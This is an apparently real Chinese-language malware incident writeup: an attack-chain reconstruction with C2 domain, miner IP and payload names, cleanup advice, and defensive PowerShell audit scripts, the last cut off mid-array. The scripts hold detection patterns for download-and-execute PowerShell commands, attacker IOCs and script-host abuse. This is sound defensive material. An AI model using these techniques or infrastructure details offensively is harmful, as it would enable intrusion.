| Teakettlesers       | 持久化计划任务              | ✅ 已注销              |
| boost_interprocess  | 挖矿进程 IPC 残留           | ✅ 已删除              |
| 矿池连接            | C2 网络通信                 | ✅ 已断开              |

### 攻击链还原

```
恶意 PowerShell 命令（你执行的那条）
  → 下载 thermionical.ps1 loader
  → 创建定时计划任务保持持久化
  → loader 连接 C2 (nonacquireish.com)
  → C2 下发三个载荷：
      ├── Crisp.exe（挖矿，连接矿池赚钱）
      ├── Runner-Razor（屏幕监控，3月30日起已运行数天）
      └── InfoStealer（窃取浏览器密码/Cookie）
```

### 仍需完成的善后

系统层面已清理干净，但**被盗数据无法召回**。以下是必须做的事：

1. **改密码** — 浏览器保存的所有密码，优先级：邮箱 → 银行/支付宝/微信 → 工作系统 → 其他
2. **注销所有会话** — 各平台执行"退出所有设备"，Cookie 泄露后改密码不够，必须让旧会话失效
3. **轮换工作凭据** — Rancher 管理密码、SSH 密钥、数据库密码、服务器登录凭据
4. **火绒全盘扫描** — 做最后的收尾确认
5. **溯源那条 PowerShell** — 搞清楚从哪里获得的，防止再次中招

-----------

## 预防措施

考虑到你的技术背景，我给你做一个实用的日常巡检脚本和关注要点。这个巡检脚本覆盖了本次事件暴露的所有攻击面，共 10 项检查。使用方式：

```powershell
# 日常巡检（管理员 PowerShell 中运行）
.\daily-security-audit.ps1

# 导出报告到桌面
.\daily-security-audit.ps1 -ExportLog
```

### 脚本检查的 10 个维度

| #    | 检查项                  | 对应本次攻击                                   |
| ---- | ----------------------- | ---------------------------------------------- |
| 1    | 非标准路径计划任务      | Teakettlesers、UIThread_net48_i386             |
| 2    | 可疑路径进程 + 高 CPU   | Crisp.exe 挖矿                                 |
| 3    | 恶意 IP / 矿池端口连接  | 91.199.163.124:3333                            |
| 4    | 注册表 Run 启动项       | 持久化检查                                     |
| 5    | WMI 事件订阅            | 无文件持久化                                   |
| 6    | ProgramData 新目录      | Paliz、Decipheringizations、srv_runtime_v9_rtm |
| 7    | 用户目录新文件夹        | C:\Users\SW\srv_runtime_v9_rtm                 |
| 8    | PowerShell 危险命令日志 | irm + iex 组合                                 |
| 9    | DNS 缓存恶意域名        | nonacquireish.com                              |
| 10   | 启动文件夹新增项        | 启动目录持久化                                 |

### 脚本之外还需要注意的习惯

**开启 PowerShell 日志**（这次如果开了，能直接看到下载的完整恶意代码）：

```powershell
# 开启 Script Block Logging（一次性设置）
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

**日常防护要点：**任何网站弹框要求你在终端/运行框中执行命令，100% 是攻击。把这个原则也告诉你朋友和身边的人。



## 脚本反馈

高级运维的朋友看了下脚本，回复如下： 这份脚本的方向是对的，但原版有几处会明显影响结果：

- 进程白名单判断有 bug，会导致白名单基本不生效，误报偏多。
- WMI 检查会把正常系统项也报异常，尤其是默认的 `SCM Event Log Filter`。
- 网络私网判断不完整，漏了 `172.19–172.31` 和常见 IPv6 本地地址。
- 启动项检查范围偏窄，少了 `WOW6432Node`，也没覆盖 `cmd / wscript / mshta / rundll32 / regsvr32` 这些常见宿主。
- 高 CPU 检查意义不大，你原来用的是累计 CPU 秒数，不适合做“每日巡检告警”。
- `SafeTaskPaths` 定义了但实际上没用上。 我已经帮你整理成一版更稳的优化脚本，主要改了这些：
- 修正白名单逻辑，减少误报。
- WMI 只把 CommandLineEventConsumer 和非默认绑定当重点告警。
- 扩展了启动项、计划任务、网络外连、近期新增脚本/可执行文件的检查。
- 增加 Defender 状态 检查。
- 告警分成 High / Medium / Low，更适合每日看。
- 保留文本导出，方便你每天留档对比。

我已经直接重写成一版 Windows PowerShell 5.1 和 PowerShell 7.x 都能跑 的兼容版本，并且用 UTF-8 with BOM 保存，避免 5.1 再因为编码出错。

这版我已经顺手修掉了你原来那几类问题：

- `try/catch` 和括号结构重写，避免解析错误
- 去掉了容易在 5.1 出问题的写法
- 按 5.1 兼容方式处理字符串和输出
- 保留了这些巡检项：Defender、计划任务、启动项、进程、网络、WMI、近期文件、DNS、PowerShell 日志、Prefetch
- WMI 默认的 `SCM Event Log Filter` 不再误报
- 进程白名单逻辑也修正了

执行以下命令的结果见附件 pwsh -ExecutionPolicy Bypass -File .\daily-security-audit-compatible.ps1 -RecentDays 3 -ExportText

### v2脚本

```bat
#Requires -RunAsAdministrator
param(
    [int]$RecentDays = 3,
    [switch]$ExportText,
    [string]$TextLogPath = "$env:USERPROFILE\Desktop\security-audit-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
)

$ErrorActionPreference = 'SilentlyContinue'

# Compatible with Windows PowerShell 5.1 and PowerShell 7.x

$KnownBadIPs = @(
    '91.199.163.124'
)

$KnownBadDomainKeywords = @(
    'underperformize',
    'nonacquireish'
)

$SuspiciousPorts = @(3333,3334,4444,5555,7777,8888,9999,14444,14433)

$SafePathPrefixes = @(
    'C:\Windows\',
    'C:\Program Files\',
    'C:\Program Files (x86)\',
    'D:\Program Files\',
    'D:\Program Files (x86)\',
    'D:\tools\'
)

$SafeRootTaskPatterns = @(
    'Adobe Acrobat Update Task',
    'BlueStacksHelper*',
    'eaio_watchdog*',
    'Huorong *',
    'Launch Adobe *',
    'Lenovo *',
    'MicrosoftEdgeUpdateTask*',
    'mihomo-*',
    'npcapwatchdog',
    'OneDrive *',
    'RtkAudUService64_BG',
    'Start-aTrustService-*',
    'ZoomUpdateTaskUser-*'
)

$KnownProgramDataPatterns = @(
    'Microsoft','Adobe','Apple','Package Cache','Packages','chocolatey',
    'ssh','123SyncCloud','Lenovo','VMware','USOPrivate','USOShared',
    'regid*','Comms','Intel','Huorong','Brother','Netease','Mozilla',
    'dtprinter','Autodesk','NVIDIA*','Dell','HP','Realtek','Docker',
    'Oracle','MySQL','Git','Citrix'
)

$RecentFileExcludePathPatterns = @(
    '*\Tencent\xwechat\*',
    '*\Mozilla\Firefox\*',
    '*\MozillaBackgroundTask*',
    '*\DingTalk_*\Default\Extensions\*',
    '*\Google\Chrome\User Data\*\Extensions\*',
    '*\Microsoft\Windows\INetCache\*',
    '*\Microsoft\Windows\WebCache\*',
    '*\Packages\*',
    '*\Temp\*\DISM\*',
    '*\Windows\SoftwareDistribution\*',
    '*\ProgramData\Microsoft\*',
    '*\ProgramData\chocolatey\*',
    '*\AppData\Local\Programs\*'
)

$RecentFileHighRiskExtensions = @('.exe','.dll','.ps1','.bat','.cmd','.vbs','.jse','.hta','.scr')
$RecentFileLowSignalExtensions = @('.js')

$SuspiciousProcessNames = @(
    'powershell','pwsh','cmd','wscript','cscript','mshta','rundll32','regsvr32'
)

$Findings = New-Object System.Collections.ArrayList
$WarningCount = 0
$Now = Get-Date
$Cutoff = $Now.AddDays(-1 * $RecentDays)

function Write-Banner {
    param([string]$Title)
    $line = ('=' * 72)
    Write-Host ''
    Write-Host $line -ForegroundColor Cyan
    Write-Host ('  ' + $Title) -ForegroundColor Cyan
    Write-Host $line -ForegroundColor Cyan
}

function Add-Finding {
    param(
        [string]$Severity,
        [string]$Category,
        [string]$Message,
        [string]$Detail = ''
    )

    if ($Severity -ne 'Info') {
        $script:WarningCount = $script:WarningCount + 1
    }

    $entry = [PSCustomObject]@{
        Time     = Get-Date
        Severity = $Severity
        Category = $Category
        Message  = $Message
        Detail   = $Detail
    }
    [void]$script:Findings.Add($entry)

    $prefix = '[INFO]'
    $color = 'Gray'
    switch ($Severity) {
        'High'   { $prefix = '[HIGH]'; $color = 'Red' }
        'Medium' { $prefix = '[MED ]'; $color = 'Yellow' }
        'Low'    { $prefix = '[LOW ]'; $color = 'DarkYellow' }
        'Info'   { $prefix = '[INFO]'; $color = 'Gray' }
        default  { $prefix = '[' + $Severity + ']'; $color = 'Gray' }
    }

    Write-Host ('  ' + $prefix + ' ' + $Message) -ForegroundColor $color
    if ($Detail) {
        Write-Host ('        ' + $Detail) -ForegroundColor Gray
    }
}

function Write-OK {
    param([string]$Message)
    Write-Host ('  [OK] ' + $Message) -ForegroundColor Green
}

function Test-MatchAny {
    param([string]$Value, [string[]]$Patterns)
    if ([string]::IsNullOrWhiteSpace($Value)) { return $false }
    foreach ($pattern in $Patterns) {
        if ($Value -like $pattern) { return $true }
    }
    return $false
}

function Get-WmiCompat {
    param([string]$Namespace, [string]$Class)
    if (Get-Command Get-CimInstance -ErrorAction SilentlyContinue) {
        return Get-CimInstance -Namespace $Namespace -ClassName $Class -ErrorAction SilentlyContinue
    }
    if (Get-Command Get-WmiObject -ErrorAction SilentlyContinue) {
        return Get-WmiObject -Namespace $Namespace -Class $Class -ErrorAction SilentlyContinue
    }
    return $null
}

function Test-RecentFileExcluded {
    param([string]$Path)
    return (Test-MatchAny -Value $Path -Patterns $RecentFileExcludePathPatterns)
}

function Test-SafePath {
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $false }
    foreach ($prefix in $SafePathPrefixes) {
        if ($Path -like ($prefix + '*')) { return $true }
    }
    return $false
}

function Test-PrivateOrLocalAddress {
    param([string]$Address)
    if ([string]::IsNullOrWhiteSpace($Address)) { return $true }
    if ($Address -eq '127.0.0.1' -or $Address -eq '::1' -or $Address -eq '0.0.0.0') { return $true }
    if ($Address -like '10.*') { return $true }
    if ($Address -like '192.168.*') { return $true }
    if ($Address -like '169.254.*') { return $true }
    if ($Address -like '172.*') {
        $parts = $Address.Split('.')
        if ($parts.Count -ge 2) {
            $second = 0
            try { $second = [int]$parts[1] } catch { $second = -1 }
            if ($second -ge 16 -and $second -le 31) { return $true }
        }
    }
    if ($Address -like 'fe80:*' -or $Address -like 'fc*' -or $Address -like 'fd*') { return $true }
    return $false
}

function Get-TaskActionRows {
    $rows = @()
    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
    foreach ($task in $tasks) {
        foreach ($action in $task.Actions) {
            $rows += [PSCustomObject]@{
                TaskPath  = $task.TaskPath
                TaskName  = $task.TaskName
                State     = $task.State
                Execute   = [string]$action.Execute
                Arguments = [string]$action.Arguments
            }
        }
    }
    return $rows
}

function Get-RegistryRunRows {
    $paths = @(
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
    )

    $rows = @()
    foreach ($path in $paths) {
        $item = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
        if (-not $item) { continue }
        foreach ($prop in $item.PSObject.Properties) {
            if ($prop.Name -in @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider')) { continue }
            $rows += [PSCustomObject]@{
                HivePath = $path
                Name     = [string]$prop.Name
                Value    = [string]$prop.Value
            }
        }
    }
    return $rows
}

function Get-RecentInterestingFiles {
    param([string[]]$Roots)
    $items = @()
    foreach ($root in $Roots) {
        if (-not (Test-Path $root)) { continue }
        $items += Get-ChildItem -Path $root -Recurse -Force -File -ErrorAction SilentlyContinue | Where-Object {
            $_.CreationTime -gt $Cutoff -and
            $_.Extension -match '^(\.exe|\.dll|\.ps1|\.bat|\.cmd|\.vbs|\.js|\.jse|\.hta|\.scr)$' -and
            -not (Test-RecentFileExcluded -Path $_.FullName)
        }
    }
    return $items
}

Write-Banner '0. Defender status'
try {
    if (Get-Command Get-MpComputerStatus -ErrorAction SilentlyContinue) {
        $mp = Get-MpComputerStatus
        if ($mp) {
            if ($mp.RealTimeProtectionEnabled -eq $false) {
                Add-Finding 'High' 'Defender' 'Defender real-time protection is disabled'
            }
            if ($mp.AntivirusEnabled -eq $false) {
                Add-Finding 'High' 'Defender' 'Defender antivirus is not enabled'
            }
            if ($mp.BehaviorMonitorEnabled -eq $false) {
                Add-Finding 'Medium' 'Defender' 'Behavior monitoring is disabled'
            }
            if ($mp.IoavProtectionEnabled -eq $false) {
                Add-Finding 'Medium' 'Defender' 'Downloaded file scanning (IOAV) is disabled'
            }
            Write-OK ('Defender status read successfully; signature updated: ' + $mp.AntivirusSignatureLastUpdated)
        }

        if (Get-Command Get-MpThreatDetection -ErrorAction SilentlyContinue) {
            $threats = Get-MpThreatDetection -ErrorAction SilentlyContinue | Where-Object {
                $_.InitialDetectionTime -and $_.InitialDetectionTime -gt $Cutoff
            }
            foreach ($t in $threats) {
                $detail = ''
                if ($t.Resources) { $detail = ($t.Resources -join '; ') }
                Add-Finding 'Medium' 'Defender' ('Recent threat detection: ' + $t.ThreatName) $detail
            }
        }
    } else {
        Add-Finding 'Low' 'Defender' 'Defender cmdlets not available in this PowerShell session'
    }
} catch {
    Add-Finding 'Low' 'Defender' 'Failed to read Defender status' $_.Exception.Message
}

Write-Banner '1. Scheduled tasks'
try {
    $taskRows = Get-TaskActionRows
    $flaggedTaskIds = @{}

    foreach ($row in $taskRows) {
        $taskId = $row.TaskPath + '|' + $row.TaskName
        $exe = [string]$row.Execute
        $args = [string]$row.Arguments
        $combined = ($exe + ' ' + $args)

        if (($exe -match 'powershell|pwsh') -and ($args -match 'Bypass|Hidden|EncodedCommand|FromBase64String|IEX|Invoke-Expression')) {
            if (-not $flaggedTaskIds.ContainsKey($taskId)) {
                Add-Finding 'High' 'Task' ('High-risk scheduled task: ' + $row.TaskPath + $row.TaskName) $combined
                $flaggedTaskIds[$taskId] = $true
            }
            continue
        }

        if (($combined -match '\\Users\\|\\Temp\\|\\AppData\\|\\ProgramData\\') -and ($combined -notmatch '\\ProgramData\\Microsoft\\|\\ProgramData\\chocolatey\\')) {
            if (-not $flaggedTaskIds.ContainsKey($taskId)) {
                Add-Finding 'High' 'Task' ('Task runs from suspicious location: ' + $row.TaskPath + $row.TaskName) $combined
                $flaggedTaskIds[$taskId] = $true
            }
            continue
        }

        if ($combined -match '\.ps1|mshta|wscript|cscript|rundll32|regsvr32') {
            if (-not $flaggedTaskIds.ContainsKey($taskId)) {
                Add-Finding 'Medium' 'Task' ('Task parameters contain risky host: ' + $row.TaskPath + $row.TaskName) $combined
                $flaggedTaskIds[$taskId] = $true
            }
        }
    }

    $allTasks = Get-ScheduledTask -ErrorAction SilentlyContinue
    foreach ($task in $allTasks) {
        if ($task.TaskPath -eq '\') {
            if (-not (Test-MatchAny $task.TaskName $SafeRootTaskPatterns)) {
                Add-Finding 'Low' 'Task' ('Unknown root task: ' + $task.TaskName) ('State: ' + $task.State)
            }
        } elseif (($task.TaskPath -notlike '\Microsoft\*') -and ($task.TaskPath -notlike '\GoogleSystem\*') -and ($task.TaskPath -notlike '\Mozilla\*') -and ($task.TaskPath -notlike '\QuarkUpdaterSystem\*') -and ($task.TaskPath -notlike '\Lenovo\*')) {
            Add-Finding 'Low' 'Task' ('Non-standard task path: ' + $task.TaskPath + $task.TaskName) ('State: ' + $task.State)
        }
    }
} catch {
    Add-Finding 'Low' 'Task' 'Failed to inspect scheduled tasks' $_.Exception.Message
}

Write-Banner '2. Startup and Run keys'
try {
    $runRows = Get-RegistryRunRows
    foreach ($row in $runRows) {
        $value = [string]$row.Value
        if ([string]::IsNullOrWhiteSpace($value)) { continue }

        if ($value -match 'powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32') {
            Add-Finding 'High' 'Startup' ('Autorun uses script host: ' + $row.Name) ($row.HivePath + ' => ' + $value)
            continue
        }

        if (($value -match '\\Users\\|\\Temp\\|\\AppData\\|\\ProgramData\\') -and ($value -notmatch '\\ProgramData\\Microsoft\\|\\ProgramData\\chocolatey\\|\\AppData\\Local\\Programs\\')) {
            Add-Finding 'Medium' 'Startup' ('Autorun path is suspicious: ' + $row.Name) ($row.HivePath + ' => ' + $value)
            continue
        }

        if ($value -match '\.ps1|\.bat|\.cmd|\.vbs|\.js|\.hta') {
            Add-Finding 'Medium' 'Startup' ('Autorun references script file: ' + $row.Name) ($row.HivePath + ' => ' + $value)
        }
    }

    $startupPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
    )
    foreach ($path in $startupPaths) {
        if (-not (Test-Path $path)) { continue }
        $items = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            if ($item.CreationTime -gt $Cutoff -or $item.LastWriteTime -gt $Cutoff) {
                Add-Finding 'Medium' 'Startup' ('Recent startup item: ' + $item.Name) $item.FullName
            }
        }
    }
} catch {
    Add-Finding 'Low' 'Startup' 'Failed to inspect startup entries' $_.Exception.Message
}

Write-Banner '3. Processes'
try {
    $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path }
    foreach ($proc in $procs) {
        $path = [string]$proc.Path
        $name = [string]$proc.Name
        $pidValue = [string]$proc.Id

        if (($name -in $SuspiciousProcessNames) -and (-not (Test-SafePath $path))) {
            Add-Finding 'High' 'Process' ('Suspicious host process path: ' + $name + ' (PID ' + $pidValue + ')') $path
            continue
        }

        if (($path -like '*\Temp\*') -or ($path -like '*\AppData\Local\Temp\*')) {
            Add-Finding 'High' 'Process' ('Process runs from Temp: ' + $name + ' (PID ' + $pidValue + ')') $path
            continue
        }

        if (($path -like 'C:\ProgramData\*') -and ($path -notlike 'C:\ProgramData\Microsoft\*') -and ($path -notlike 'C:\ProgramData\chocolatey\*')) {
            Add-Finding 'High' 'Process' ('Process runs from ProgramData: ' + $name + ' (PID ' + $pidValue + ')') $path
            continue
        }

        if (($path -like 'C:\Users\*') -and ($path -notlike '*\AppData\Local\Programs\*') -and ($path -notlike '*\AppData\Roaming\*') -and (-not (Test-SafePath $path))) {
            Add-Finding 'Medium' 'Process' ('Process runs from unusual user path: ' + $name + ' (PID ' + $pidValue + ')') $path
        }
    }
} catch {
    Add-Finding 'Low' 'Process' 'Failed to inspect processes' $_.Exception.Message
}

Write-Banner '4. Network connections'
try {
    $conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
    foreach ($conn in $conns) {
        $remote = [string]$conn.RemoteAddress
        $remotePort = [string]$conn.RemotePort
        $pidValue = $conn.OwningProcess

        if ($remote -in $KnownBadIPs) {
            Add-Finding 'High' 'Network' ('Connection to known bad IP: ' + $remote + ':' + $remotePort) ('PID: ' + $pidValue)
            continue
        }

        if ($conn.RemotePort -in $SuspiciousPorts) {
            Add-Finding 'Medium' 'Network' ('Connection to suspicious port: ' + $remote + ':' + $remotePort) ('PID: ' + $pidValue)
        }

        if (-not (Test-PrivateOrLocalAddress $remote)) {
            $proc = Get-Process -Id $pidValue -ErrorAction SilentlyContinue
            if ($proc -and $proc.Path) {
                $path = [string]$proc.Path
                if (($path -like '*\Temp\*') -or (($path -like 'C:\ProgramData\*') -and ($path -notlike 'C:\ProgramData\Microsoft\*')) -or (($proc.Name -in $SuspiciousProcessNames) -and (-not (Test-SafePath $path)))) {
                    Add-Finding 'High' 'Network' ('External connection from suspicious process: ' + $proc.Name + ' -> ' + $remote + ':' + $remotePort) $path
                }
            }
        }
    }
} catch {
    Add-Finding 'Low' 'Network' 'Failed to inspect network connections' $_.Exception.Message
}

Write-Banner '5. WMI persistence'
try {
    $filters = Get-WmiCompat -Namespace root\subscription -Class __EventFilter
    $cmdConsumers = Get-WmiCompat -Namespace root\subscription -Class CommandLineEventConsumer
    $scriptConsumers = Get-WmiCompat -Namespace root\subscription -Class ActiveScriptEventConsumer
    $bindings = Get-WmiCompat -Namespace root\subscription -Class __FilterToConsumerBinding

    foreach ($c in $cmdConsumers) {
        $detail = ''
        if ($c.CommandLineTemplate) { $detail = [string]$c.CommandLineTemplate }
        Add-Finding 'High' 'WMI' ('CommandLineEventConsumer present: ' + $c.Name) $detail
    }

    foreach ($c in $scriptConsumers) {
        $detail = ''
        if ($c.ScriptingEngine) { $detail = 'Engine: ' + $c.ScriptingEngine }
        Add-Finding 'High' 'WMI' ('ActiveScriptEventConsumer present: ' + $c.Name) $detail
    }

    foreach ($f in $filters) {
        if ($f.Name -eq 'SCM Event Log Filter' -and $f.Query -eq 'select * from MSFT_SCMEventLogEvent') {
            continue
        }
        Add-Finding 'Low' 'WMI' ('Non-default WMI event filter: ' + $f.Name) ([string]$f.Query)
    }

    foreach ($b in $bindings) {
        $consumer = [string]$b.Consumer
        if ($consumer -like '*SCM Event Log Consumer*') { continue }
        Add-Finding 'Medium' 'WMI' ('WMI filter-to-consumer binding present') ($consumer + ' <= ' + [string]$b.Filter)
    }
} catch {
    Add-Finding 'Low' 'WMI' 'Failed to inspect WMI persistence' $_.Exception.Message
}

Write-Banner '6. Recent files and folders'
try {
    $roots = @('C:\ProgramData', $env:APPDATA, $env:LOCALAPPDATA, $env:TEMP)
    $interestingFiles = Get-RecentInterestingFiles -Roots $roots
    foreach ($item in $interestingFiles) {
        $detail = $item.FullName + ' | Created: ' + $item.CreationTime
        $ext = $item.Extension.ToLowerInvariant()

        if ($RecentFileHighRiskExtensions -contains $ext) {
            Add-Finding 'Medium' 'Files' ('Recent script or binary file: ' + $item.Name) $detail
            continue
        }

        if (($RecentFileLowSignalExtensions -contains $ext) -and ($item.FullName -like 'C:\ProgramData\*' -or $item.FullName -like ($env:TEMP + '*'))) {
            Add-Finding 'Low' 'Files' ('Recent low-signal script file: ' + $item.Name) $detail
        }
    }

    $pdTop = Get-ChildItem -Path 'C:\ProgramData' -Force -ErrorAction SilentlyContinue
    foreach ($item in $pdTop) {
        if ($item.CreationTime -le $Cutoff) { continue }
        if (Test-MatchAny $item.Name $KnownProgramDataPatterns) { continue }
        Add-Finding 'Low' 'ProgramData' ('Recent top-level ProgramData item: ' + $item.Name) ('Created: ' + $item.CreationTime)
    }
} catch {
    Add-Finding 'Low' 'Files' 'Failed to inspect recent files and folders' $_.Exception.Message
}

Write-Banner '7. DNS cache'
try {
    $dnsCache = Get-DnsClientCache -ErrorAction SilentlyContinue
    foreach ($keyword in $KnownBadDomainKeywords) {
        $hits = $dnsCache | Where-Object { $_.Entry -like ('*' + $keyword + '*') }
        foreach ($hit in $hits) {
            Add-Finding 'High' 'DNS' ('DNS cache hit for suspicious domain keyword: ' + $hit.Entry)
        }
    }
} catch {
    Add-Finding 'Low' 'DNS' 'Failed to inspect DNS cache' $_.Exception.Message
}

Write-Banner '8. PowerShell logs'
try {
    $events = Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue | Where-Object {
        $_.Id -eq 4104 -and $_.TimeCreated -gt $Cutoff
    } | Select-Object -First 20

    foreach ($evt in $events) {
        $msg = [string]$evt.Message
        if ($msg -match 'Invoke-RestMethod|Invoke-WebRequest|IEX|EncodedCommand|FromBase64String|underperformize|nonacquireish') {
            Add-Finding 'High' 'PowerShellLog' ('Suspicious PowerShell script block: ' + $evt.TimeCreated) ($msg.Substring(0, [Math]::Min(220, $msg.Length)).Replace("`r",' ').Replace("`n",' '))
        }
    }
} catch {
    Add-Finding 'Low' 'PowerShellLog' 'Failed to inspect PowerShell operational log' $_.Exception.Message
}

Write-Banner '9. Startup folders'
try {
    $startupPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
    )
    foreach ($path in $startupPaths) {
        if (-not (Test-Path $path)) { continue }
        $items = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            if ($item.CreationTime -gt $Cutoff -or $item.LastWriteTime -gt $Cutoff) {
                Add-Finding 'Medium' 'StartupFolder' ('Recent startup folder item: ' + $item.Name) $item.FullName
            }
        }
    }
} catch {
    Add-Finding 'Low' 'StartupFolder' 'Failed to inspect Startup folders' $_.Exception.Message
}

Write-Banner '10. Prefetch'
try {
    if (Test-Path 'C:\Windows\Prefetch') {
        $pfItems = Get-ChildItem -Path 'C:\Windows\Prefetch' -ErrorAction SilentlyContinue | Where-Object {
            $_.LastWriteTime -gt $Cutoff -and $_.Name -match 'POWERSHELL|CMD|WSCRIPT|CSCRIPT|MSHTA|RUNDLL32|REGSVR32'
        }
        foreach ($pf in $pfItems) {
            Add-Finding 'Low' 'Prefetch' ('Recent prefetch for script host: ' + $pf.Name) ('LastWrite: ' + $pf.LastWriteTime)
        }
    }
} catch {
    Add-Finding 'Low' 'Prefetch' 'Failed to inspect Prefetch' $_.Exception.Message
}

Write-Host ''
$line = ('=' * 72)
$summaryColor = 'Green'
if ($WarningCount -gt 0) { $summaryColor = 'Red' }
Write-Host $line -ForegroundColor $summaryColor
if ($WarningCount -gt 0) {
    Write-Host ('  Audit complete - findings: ' + $WarningCount) -ForegroundColor $summaryColor
} else {
    Write-Host '  Audit complete - no obvious findings' -ForegroundColor $summaryColor
}
Write-Host $line -ForegroundColor $summaryColor

if ($Findings.Count -gt 0) {
    foreach ($f in $Findings) {
        $detail = ''
        if ($f.Detail) { $detail = ' | ' + $f.Detail }
        Write-Host ('  [' + $f.Severity + '] ' + $f.Category + ' - ' + $f.Message + $detail)
    }
}

if ($ExportText) {
    $lines = @()
    $lines += ('Security audit report - ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
    $lines += ('Computer: ' + $env:COMPUTERNAME + '  User: ' + $env:USERNAME)
    $lines += $line
    $lines += ('RecentDays: ' + $RecentDays)
    $lines += ('WarningCount: ' + $WarningCount)
    $lines += ''

    foreach ($f in $Findings) {
        $lines += ('[' + $f.Severity + '] [' + $f.Category + '] ' + $f.Message)
        if ($f.Detail) {
            $lines += ('    ' + $f.Detail)
        }
    }

    $dir = Split-Path -Path $TextLogPath -Parent
    if ($dir -and (-not (Test-Path $dir))) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    $lines | Out-File -FilePath $TextLogPath -Encoding UTF8
    Write-Host ('`n  Text report exported: ' + $TextLogPath) -ForegroundColor Cyan
}

```



## 运行脚本命令

```bat
#powershell 5.1
powershell -ExecutionPolicy Bypass -File .\daily-security-audit-compatible-v3.1-fixed.ps1 -RecentDays 3 -ExportText

#powershell 7.x
pwsh -ExecutionPolicy Bypass -File .\daily-security-audit-compatible-v3.1-fixed.ps1 -RecentDays 3 -ExportText
```



## 降噪修复版本

```powershell
#requires -version 3.0
[CmdletBinding()]
param(
    [int]$RecentDays = 3,
    [switch]$ExportText,
    [int]$PrefetchHours = 12
)

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'SilentlyContinue'

# -----------------------------
# Global state
# -----------------------------
$Now = Get-Date
$Since = $Now.AddDays(-1 * $RecentDays)
$PrefetchSince = $Now.AddHours(-1 * $PrefetchHours)

$Script:MainFindings = New-Object System.Collections.ArrayList
$Script:AppendixFindings = New-Object System.Collections.ArrayList
$Script:SeenFindingKeys = @{}

# -----------------------------
# Helpers
# -----------------------------
function Add-Finding {
    param(
        [ValidateSet('High','Medium','Low','Info')]
        [string]$Severity,
        [string]$Category,
        [string]$Title,
        [string]$Detail,
        [switch]$AppendixOnly
    )

    $key = '{0}|{1}|{2}|{3}' -f $Severity, $Category, $Title, $Detail
    if ($Script:SeenFindingKeys.ContainsKey($key)) { return }
    $Script:SeenFindingKeys[$key] = $true

    $item = [PSCustomObject]@{
        Severity = $Severity
        Category = $Category
        Title    = $Title
        Detail   = $Detail
    }

    if ($AppendixOnly -or $Severity -in @('Low','Info')) {
        [void]$Script:AppendixFindings.Add($item)
    }
    else {
        [void]$Script:MainFindings.Add($item)
    }
}

function Test-PathRegex {
    param(
        [string]$Value,
        [string[]]$Patterns
    )
    if (-not $Value) { return $false }
    foreach ($p in $Patterns) {
        if ($Value -match $p) { return $true }
    }
    return $false
}

function Get-SignatureStatus {
    param([string]$Path)
    try {
        if (-not (Test-Path -LiteralPath $Path)) { return 'Missing' }
        $sig = Get-AuthenticodeSignature -FilePath $Path
        if ($null -eq $sig) { return 'Unknown' }
        return [string]$sig.Status
    }
    catch {
        return 'Unknown'
    }
}

function Normalize-Path {
    param([string]$Path)
    if (-not $Path) { return $null }
    try {
        return [Environment]::ExpandEnvironmentVariables($Path)
    }
    catch {
        return $Path
    }
}

function Get-TaskActionObjects {
    $rows = @()
    try {
        $tasks = Get-ScheduledTask
        foreach ($task in $tasks) {
            $actions = @($task.Actions)
            foreach ($a in $actions) {
                $rows += [PSCustomObject]@{
                    TaskPath   = $task.TaskPath
                    TaskName   = $task.TaskName
                    Execute    = [string]$a.Execute
                    Arguments  = [string]$a.Arguments
                    State      = [string]$task.State
                    FullName   = ('{0}{1}' -f $task.TaskPath, $task.TaskName)
                }
            }
        }
    }
    catch {}
    return $rows
}

# -----------------------------
# Noise filters / allowlists
# -----------------------------
$KnownGoodTaskNames = @(
    '^\\mihomo-party-run$',
    '^\\ZoomUpdateTaskUser-.*$',
    '^\\Mozilla\\Firefox Background Update .*308046B0AF4A39CB$',
    '^\\Microsoft\\Windows\\NetTrace\\GatherNetworkInfo$'
)

$KnownGoodTaskLocations = @(
    '\\mihomo-party\\',
    '\\Zoom\\',
    '\\Mozilla\\'
)

$KnownGoodStartupNames = @(
    '^BaiduYunDetect$',
    '^ApifoxAppAgent$',
    '^Application Restart #1$',
    '^SunloginClient$'
)

$KnownGoodStartupPaths = @(
    'BaiduNetdisk',
    'apifox',
    'Adobe Desktop Common',
    'SunLogin'
)

$IgnoreRecentFilePathPatterns = @(
    '\\Tencent\\xwechat\\',
    '\\Mozilla\\Firefox\\',
    '\\MozillaBackgroundTask',
    '\\DingTalk_[^\\]+\\Default\\Extensions\\',
    '\\Google\\Chrome\\User Data\\[^\\]+\\Extensions\\',
    '\\Microsoft\\Edge\\User Data\\Edge Shopping\\',
    '\\Packages\\',
